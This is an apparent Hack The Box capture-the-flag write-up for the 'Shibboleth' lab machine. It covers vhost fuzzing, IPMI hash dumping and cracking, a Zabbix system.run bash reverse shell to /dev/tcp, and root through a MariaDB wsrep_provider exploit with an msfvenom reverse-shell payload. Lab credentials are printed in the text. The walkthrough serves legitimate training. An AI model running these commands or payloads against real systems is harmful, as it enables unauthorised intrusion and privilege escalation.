> Author: **[knightmare][author-profile]**

## Discovery

### Port Scanning

TCP:

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: FlexStart Bootstrap Template - Index
```

UDP:

```bash
PORT    STATE SERVICE
623/udp open  asf-rmcp
```

### Enumeration

Virtual hosts:

```bash
ffuf -u http://10.10.11.124/ -H 'Host: FUZZ.shibboleth.htb' -w /usr/share/wordlists/discovery/subdomains-top1million-20000.txt -mc 200
# monitor                 [Status: 200, Size: 3686, Words: 192, Lines: 30, Duration: 64ms]
# monitoring              [Status: 200, Size: 3686, Words: 192, Lines: 30, Duration: 68ms]
# zabbix                  [Status: 200, Size: 3686, Words: 192, Lines: 30, Duration: 78ms]
```

## Admin on the Web Console

```bash
msfconsole
# use auxiliary/scanner/ipmi/ipmi_cipher_zero
# set rhosts monitor.shibboleth.htb
# run
# [*] Sending IPMI requests to 10.10.11.124->10.10.11.124 (1 hosts)
# [+] 10.10.11.124:623 - IPMI - VULNERABLE: Accepted a session open request for cipher zero
# [*] Scanned 1 of 1 hosts (100% complete)
# [*] Auxiliary module execution completed
# search ipmi
# use auxiliary/scanner/ipmi/ipmi_dumphashes
# set rhosts monitor.shibboleth.htb
# run
# [+] 10.10.11.124:623 - IPMI - Hash found: Administrator:4996629102020000803e4869896a2d90db7a2bed305d9e3a8cea0a0dcbaec65e5ae344357c775d50a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:28a9b3482c123d3a6e4bdb50bc802433a31ae238
```

The IPMI service is vulnerable to authentication bypass and the admin hash
can be extracted. Then cracked:

```bash
hashcat --help | grep -ia ipmi
   # 7300 | IPMI2 RAKP HMAC-SHA1
hashcat -a 0 -m 7300 credentials/admin.hash /usr/share/wordlists/passwords/rockyou.txt 
```

> Administrator ilovepumkinpie1

It looks like a sysadmin interface: it has system logs, network monitoring,
network topology, application monitoring, etc.

## System "zabbix"

And it can run system commands! Like a native reverse shell, through the
creation of "items". There's a "system.run" key

```
system.run[/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.10/9999 0>&1',nowait]
```

Then it can be run with "Test => Get value and test".

```bash
id
# uid=110(zabbix) gid=118(zabbix) groups=118(zabbix)
```

## Pivoting to System "ipmi-svc"

The usual:

```bash
which python3
# /usr/bin/python3
cat /etc/passwd | grep -avi nologin
# root:x:0:0:root:/root:/bin/bash
# sync:x:4:65534:sync:/bin:/bin/sync
# tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
# pollinate:x:109:1::/var/cache/pollinate:/bin/false
# ipmi-svc:x:1000:1000:ipmi-svc,,,:/home/ipmi-svc:/bin/bash
# Debian-snmp:x:111:119::/var/lib/snmp:/bin/false
# mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 56 columns 135
alias ls='ls -lah --color --group-directories-first'
```

## System Root

The MySQL service is running as root:

```bash
ps aux | grep -ia mysql
# root        1224  0.0  0.0   2608  1820 ?        S    12:26   0:00 /bin/sh /usr/bin/mysqld_safe
```

Most likely the DB password is somewhere in the site config:

```bash
grep -v "^[#;]" /etc/zabbix/zabbix_server.conf | grep -v "^$"
# LogFile=/var/log/zabbix/zabbix_server.log
# LogFileSize=0
# PidFile=/run/zabbix/zabbix_server.pid
# SocketDir=/run/zabbix
# DBName=zabbix
# DBUser=zabbix
# DBPassword=bloooarskybluh
# SNMPTrapperFile=/var/log/snmptrap/snmptrap.log
# Timeout=4
# AlertScriptsPath=/usr/lib/zabbix/alertscripts
# ExternalScripts=/usr/lib/zabbix/externalscripts
# FpingLocation=/usr/bin/fping
# Fping6Location=/usr/bin/fping6
# LogSlowQueries=3000
# StatsAllowedIP=127.0.0.1
mysql -D'zabbix' -u'zabbix' -p'bloooarskybluh' -e'select version();'
# +----------------------------------+
# | version()                        |
# +----------------------------------+
# | 10.3.25-MariaDB-0ubuntu0.20.04.1 |
# +----------------------------------+
```

The DB contains other hashes, most likely useless. On the other hand this
version of MariaDB is [vulnerable][mariadb-cve]. It will trigger the
following payload:

```bash
msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f elf-so -o cve.so
```

When setting a global variable to its path:

```bash
mysql -h 127.0.0.1 -D zabbix -u zabbix -p'bloooarskybluh' \
    -e'SET GLOBAL wsrep_provider="/tmp/cve.so";'
```

It opens a root shell on the listening Netcat.

[author-profile]: https://app.hackthebox.com/users/8930

[ipmi-auth-bypass]: https://book.hacktricks.xyz/pentesting/623-udp-ipmi#vulnerability-ipmi-authentication-bypass-via-cipher-0
[mariadb-cve]: https://github.com/Al1ex/CVE-2021-27928
